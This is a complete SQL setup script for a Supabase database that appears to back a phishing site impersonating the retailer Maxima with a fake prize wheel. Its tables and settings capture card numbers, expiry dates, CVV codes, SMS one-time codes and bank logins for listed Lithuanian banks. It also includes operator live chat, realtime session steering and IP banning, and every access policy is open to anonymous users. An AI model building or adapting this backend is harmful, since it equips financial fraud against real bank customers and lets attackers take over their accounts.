-- =====================================================================
-- FULL SCHEMA — TEMIZ SUPABASE KURULUMU (tek seferde calistir)
-- Tablolar: sessions, global_settings, banks, banned_ips, chat_messages
-- + storage bucket'lari (assets, chat_images) + realtime publication
-- =====================================================================

-- ==================== 1) SESSIONS ====================
CREATE TABLE IF NOT EXISTS public.sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id bigint,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now(),
  amount numeric DEFAULT 0,
  current_step text NOT NULL DEFAULT 'win',
  status text NOT NULL DEFAULT 'offline',
  form_data jsonb NOT NULL DEFAULT '{}'::jsonb,
  is_hidden boolean DEFAULT false,
  partner_name text,
  participation_code text,
  sms_digits integer NOT NULL DEFAULT 6,
  sms_custom_text text,
  ip_address text,
  user_agent text,
  deleted_at timestamptz
);

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
ALTER TABLE public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq');
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (current_step IN (
  'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO'
));

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_delete ON public.sessions;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert_demo ON public.sessions;
CREATE POLICY sessions_anon_select ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_insert ON public.sessions FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY sessions_authenticated_all ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_public_id ON public.sessions (public_id) WHERE public_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions (ip_address, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON public.sessions (created_at DESC);

-- ==================== 2) GLOBAL_SETTINGS ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  logo_url text DEFAULT 'https://www.maxima.lt/upl/media/x80/05/7595-MicrosoftTeams-image%20%2839%29.webp?v=3-0',
  bg_url text DEFAULT '/6d4bc8553ef96b6814a98ebe96498b34.webp',
  background_url text,
  og_image_url text,
  portal_name text DEFAULT 'Maxima',
  support_center_name text DEFAULT 'Maxima pagalba',
  target_country text DEFAULT 'Lietuva',
  site_enabled boolean DEFAULT true,
  entry_page text DEFAULT '/win',
  wheel_settings jsonb DEFAULT '{}'::jsonb,
  win_title text,
  win_subtitle text,
  win_button text,
  banken_title text,
  banken_subtitle text,
  wait_title text,
  wait_subtitle text,
  sms_title text,
  card_title text,
  card_subtitle text,
  code_title text,
  code_subtitle text,
  code_button text,
  live_support_title text,
  live_support_subtitle text,
  live_support_button text,
  profile_title_small text,
  profile_title_main text,
  profile_subtitle text,
  profile_button text,
  banken_search_placeholder text,
  sms_subtitle text,
  sms_input_label text,
  sms_button text,
  sms_loading text,
  card_owner_label text,
  card_number_label text,
  card_expiry_label text,
  card_cvv_label text,
  card_button text,
  profile_firstname_label text,
  profile_lastname_label text,
  profile_phone_label text,
  profile_loading_text text,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Enable read access for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable insert for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable update for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable delete for all users" ON public.global_settings;
CREATE POLICY "Enable read access for all users" ON public.global_settings FOR SELECT USING (true);
CREATE POLICY "Enable insert for all users" ON public.global_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);

INSERT INTO public.global_settings (site_enabled, entry_page)
SELECT true, '/win' WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);

-- ==================== 3) BANKS (Litvanya) ====================
CREATE TABLE IF NOT EXISTS public.banks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE NOT NULL,
  name text NOT NULL,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  country text DEFAULT 'LT',
  is_active boolean DEFAULT true,
  design_config jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow public read access on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public insert on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public update on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public delete on banks" ON public.banks;
CREATE POLICY "Allow public read access on banks" ON public.banks FOR SELECT USING (true);
CREATE POLICY "Allow public insert on banks" ON public.banks FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow public update on banks" ON public.banks FOR UPDATE USING (true);
CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (true);

INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
  ('swedbank-lt',        'Swedbank',         '/bank-logos/lithuania/swedbank-lt.png',   'LT', true),
  ('seb-lt',             'SEB',              '/bank-logos/lithuania/seb-lt.png',        'LT', true),
  ('luminor-lt',         'Luminor',          '/bank-logos/lithuania/luminor-lt.png',    'LT', true),
  ('citadele-lt',        'Citadele',         '/bank-logos/lithuania/citadele-lt.png',   'LT', true),
  ('siauliu-bankas-lt',  'Šiaulių bankas',   '/bank-logos/lithuania/siauliu-lt.png',    'LT', true),
  ('lku-lt',             'LKU',              '/bank-logos/lithuania/lku-lt.png',        'LT', true),
  ('artea-lt',           'Artea',            '/bank-logos/lithuania/siauliu-lt.png',    'LT', true)
ON CONFLICT (slug) DO NOTHING;

-- ==================== 4) BANNED_IPS ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

-- ==================== 5) CHAT ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL REFERENCES public.sessions(id) ON DELETE CASCADE,
  sender text NOT NULL CHECK (sender IN ('user','admin')),
  content text NOT NULL,
  image_url text,
  created_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
CREATE POLICY chat_messages_anon_all ON public.chat_messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY chat_messages_auth_all ON public.chat_messages FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- ==================== 6) STORAGE BUCKET'LARI ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images', 'chat_images', true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_select" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_insert" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 7) REALTIME (canli log/presence/chat) ====================
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- Kontrol
SELECT 'sessions' t, count(*) FROM public.sessions
UNION ALL SELECT 'global_settings', count(*) FROM public.global_settings
UNION ALL SELECT 'banks', count(*) FROM public.banks
UNION ALL SELECT 'banned_ips', count(*) FROM public.banned_ips
UNION ALL SELECT 'chat_messages', count(*) FROM public.chat_messages;
